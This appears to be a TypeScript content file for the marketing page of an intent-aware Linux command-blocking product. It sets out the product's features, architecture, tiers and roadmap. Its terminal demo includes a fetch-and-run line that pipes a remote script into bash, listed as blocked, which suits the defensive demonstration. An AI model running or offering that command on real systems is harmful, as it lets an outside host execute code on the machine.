export const iaac = {
  name: "IAAC",
  fullName: "Intent-Aware Access Control",
  status: "available" as const,
  href: "/products/iaac",
  oneLiner: "Privileged commands on Linux servers, judged by intent and stopped before they run.",
  headline: "IAAC makes stolen credentials worthless.",
  summary:
    "It intercepts every command on a Linux server before it runs, judges its intent, and returns Allow, Block or Review in under a second, even when the user is root.",

  problem: {
    heading: "Privileged access means unlimited damage",
    body: "Today's controls each miss it. They decide who gets in, hunt for malware, or log what already happened. None of them judges what a valid admin is trying to do with the command in front of them.",
  },

  // "Permission isn't intent"
  gaps: [
    { control: "PAM", does: "Controls who gets the credential", gap: "Inside the session, the operator can still do anything" },
    { control: "EDR", does: "Hunts malware and anomalies", gap: "Treats a valid admin using native tools as normal" },
    { control: "SIEM / auditd", does: "Logs and alerts", gap: "Detects after the damage is done" },
    { control: "sudo / SELinux", does: "Enforces static permissions", gap: "No intent, blind to obfuscation and living-off-the-land" },
  ],

  steps: [
    {
      key: "see",
      title: "See every command",
      body: "A lightweight on-host agent intercepts interactive and background commands, backed by kernel-level enforcement.",
    },
    {
      key: "judge",
      title: "Judge its intent",
      body: "240+ rules mapped to MITRE ATT&CK, plus AI reasoning that runs on the customer's own server.",
    },
    {
      key: "decide",
      title: "Allow, Block or Review",
      body: "Safe work runs silently, harmful actions are blocked, and ambiguous ones pause for a human with an AI briefing.",
    },
  ],

  architecture: {
    enforcement: {
      // Source: IAAC overview deck, "Two planes. One source of truth."
      title: "Enforcement plane",
      where: "On your Linux server",
      points: [
        "Intercepts every command at the shell, backed by kernel-level enforcement",
        "Scores intent with the rule engine and on-box AI, then allows, blocks or sends for review",
        "Self-protects, and keeps working even if the cloud is unreachable",
      ],
    },
    control: {
      title: "Control plane",
      where: "AegisZ cloud, or fully self-hosted",
      points: [
        "Dashboard, alerts, incidents, policy and one-click audit export",
        "Approvals and dual control for dangerous actions",
        "Independently re-checks every event, so a tampered agent can't fake an approval",
      ],
    },
    caption: "Enforcement lives on your host. The cloud is control-only, and it independently re-checks every decision.",
  },

  capabilities: [
    { title: "On-box AI", body: "All AI reasoning runs on your own server; runs fully air-gapped." },
    { title: "Attack-technique detection", body: "240+ rules mapped to MITRE ATT&CK, across 11+ tactics." },
    { title: "Under a second", body: "Allow, Block or Review in line, even when the user is root." },
    { title: "Dual approval and quorum", body: "Destructive actions need more than one person; the worst are never releasable." },
    { title: "Tamper-evident audit", body: "Hash-chained log of every decision, exportable in one click." },
    { title: "Self-protecting agent", body: "Attempts to disable the guard are blocked and logged loudly." },
    { title: "Observe first, then enforce", body: "One-line install in monitor-only mode. Flip to blocking when you trust it." },
    { title: "Incidents, not noise", body: "Multi-step attacks fold into one incident. Fails open at the shell, so admins are never locked out." },
  ],

  compliance: ["PCI-DSS", "SOC 2", "ISO 27001", "HIPAA", "GDPR", "India's DPDP Act"],

  // Tier names and features from the IAAC overview deck. No pricing on the site.
  deployment: [
    { name: "Core", tagline: "Essential runtime protection", features: ["Full enforcement engine", "Alerts and tamper-evident audit", "Fleet console"] },
    { name: "Star", tagline: "Comply and scale", features: ["Everything in Core", "SSO and audit export", "SIEM integration"] },
    { name: "Max", tagline: "Govern", features: ["Everything in Star", "Advanced governance", "Dual control and quorum"] },
    {
      name: "Sovereign",
      tagline: "Self-hosted / air-gapped",
      body: "A dedicated, air-gapped, self-hosted deployment for government, defence and the most regulated estates.",
      features: ["Fully on-prem", "Air-gapped", "Zero data egress"],
      highlight: true,
    },
  ],

  roadmap: [
    { when: "Today", body: "Linux runtime enforcement, validated on a live production server." },
    { when: "Next", body: "Deeper SIEM/SOAR and ticketing integration, and hardened self-hosted delivery." },
    { when: "Then", body: "Windows, macOS, containers and Kubernetes." },
  ],
};

export type Verdict = "allow" | "block" | "review";

export const terminalDemo: { cmd: string; verdict: Verdict; reason: string }[] = [
  { cmd: "ls -a", verdict: "allow", reason: "Routine read-only listing" },
  { cmd: "curl -s http://203.0.113.7/x.sh | bash", verdict: "block", reason: "Remote script piped straight into a shell" },
  { cmd: "docker rm prod-db", verdict: "review", reason: "Destructive action on production, paused for approval" },
];
